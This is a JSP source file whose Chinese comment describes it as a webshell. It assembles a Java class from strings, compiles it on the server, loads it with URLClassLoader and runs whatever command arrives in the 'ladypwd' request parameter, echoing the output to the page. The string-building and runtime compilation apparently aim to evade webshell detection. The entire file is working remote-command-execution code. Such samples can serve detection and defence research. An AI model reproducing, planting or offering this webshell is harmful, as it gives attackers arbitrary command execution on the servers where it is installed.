<%@ page import="java.nio.file.Files" %>
<%@ page import="javax.tools.*" %>
<%@ page import="java.util.Locale" %>
<%@ page import="java.nio.charset.Charset" %>
<%@ page import="java.util.Random" %>
<%@ page import="java.io.File" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
使用URLClassLoader加载本地(file://)类，该类的代码用字符串去拼凑，并在服务端进行编译(使用JavaCompiler),
从而实现JSP Webshll
--%>
<%
    String c = request.getParameter("ladypwd");
    String tmpPath = Files.createTempDirectory("localdemo").toFile().getPath();
    JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();
    DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector();
    StandardJavaFileManager standardJavaFileManager = javaCompiler
            .getStandardFileManager(diagnostics, Locale.CHINA, Charset.forName("utf-8"));
    int id = new Random().nextInt(10000000);
    StringBuilder sb = new StringBuilder()
            .append("import java.io.BufferedReader;\n")
            .append("import java.io.IOException;\n")
            .append("import java.io.InputStream;\n")
            .append("import java.io.InputStreamReader;\n")
            .append("public class LocalDemo" + id + " {\n")
            .append("    String sret;\n")
            .append("    public LocalDemo" + id + "(String cmd) {\n")
            .append("        try {\n")
            .append("            InputStream in = Runtime.getRuntime().exec(cmd.split(\" \")).getInputStream();")
            .append("            StringBuilder sb = new StringBuilder();\n")
            .append("            BufferedReader br = new BufferedReader(new InputStreamReader(in));\n")
            .append("            String line = null;\n")
            .append("            while ((line = br.readLine()) != null) {\n")
            .append("                sb.append(line).append(\"\\n\");\n")
            .append("            }\n")
            .append("            sret = sb.toString();\n")
            .append("        } catch (Exception e) {\n")
            .append("            e.printStackTrace();\n")
            .append("        }\n")
            .append("    }\n")
            .append("    @Override\n")
            .append("    public String toString() {\n")
            .append("        return sret;\n")
            .append("    }\n")
            .append("}");
    Files.write(Paths.get(tmpPath + File.separator + "LocalDemo" +id + ".java"), sb.toString().getBytes());
    Iterable fileObject = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + "LocalDemo" +id + ".java");
    javaCompiler.getTask(null, standardJavaFileManager, diagnostics, null, null, fileObject).call();
    out.print("<pre>");
    out.print(new URLClassLoader(new URL[]{new URL("file:" + tmpPath + File.separator)}).loadClass("LocalDemo" + id).getConstructor(String.class).newInstance(c).toString());
    out.print("</pre>");
%>
